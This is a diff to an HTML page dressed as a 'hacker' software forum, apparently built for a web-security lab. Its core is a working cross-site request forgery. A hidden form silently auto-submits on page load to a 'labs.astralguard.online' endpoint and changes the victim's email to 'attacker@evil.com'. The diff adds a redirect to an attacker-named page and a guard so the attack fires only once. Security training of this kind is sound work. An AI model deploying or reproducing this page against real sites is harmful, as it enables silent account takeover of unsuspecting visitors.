@@ -57,7 +57,6 @@
     .control.close { background: var(--hacker-red); }
     .control.minimize { background: #ff0; }
     .control.expand { background: var(--hacker-green); }
-    
     .terminal-title { font-size: 0.7rem; color: var(--hacker-green); flex-grow: 1; }
     
     .header-content { padding: 1rem; text-align: center; }
@@ -171,22 +170,15 @@
 <body>
   <div class="hacker-noise"></div>
 
-  <!-- 
-    CSRF ATTACK VECTOR
-    Hidden iframe + form combo — fires on page load as a top-level GET
-    navigation inside the iframe, which satisfies SameSite=Lax cookie policy.
-    The victim never sees this.
-  -->
-  <iframe name="csrf-frame" style="display:none;" id="csrfFrame"></iframe>
   <form
     id="csrfForm"
     action="https://labs.astralguard.online/api/csrf-get"
     method="GET"
-    target="csrf-frame"
     style="display:none;"
   >
     <input type="hidden" name="change" value="1" />
     <input type="hidden" name="email" value="attacker@evil.com" />
+    <input type="hidden" name="return_to" value="https://www.volkdonations.website/csrf-get-attacker" />
   </form>
 
   <div class="container">
@@ -275,14 +267,16 @@
 
     <div class="footer">
       <p>CONNECTED TO TOR NETWORK | ENCRYPTED: YES | TRACKERS: 0 BLOCKED</p>
-      <p>© 2025 ASTRALGUARD FREE SOFTWARE FORUM | ALL RIGHTS RESERVED</p>
+      <p>© 2026 ASTRALGUARD FREE SOFTWARE FORUM | ALL RIGHTS RESERVED</p>
     </div>
   </div>
 
   <script>
-    // Fire CSRF silently on page load
     window.onload = function () {
-      document.getElementById('csrfForm').submit();
+      if (!sessionStorage.getItem('csrf_fired')) {
+        sessionStorage.setItem('csrf_fired', '1');
+        document.getElementById('csrfForm').submit();
+      }
     };
 
     function fakeClaim() {
@@ -292,7 +286,7 @@
 
     document.addEventListener('DOMContentLoaded', function () {
       const titles = document.querySelectorAll('.post-content p');
-      titles.forEach(title => {
+      titles.forEach(function(title) {
         const originalText = title.textContent;
         title.textContent = '';
         let i = 0;
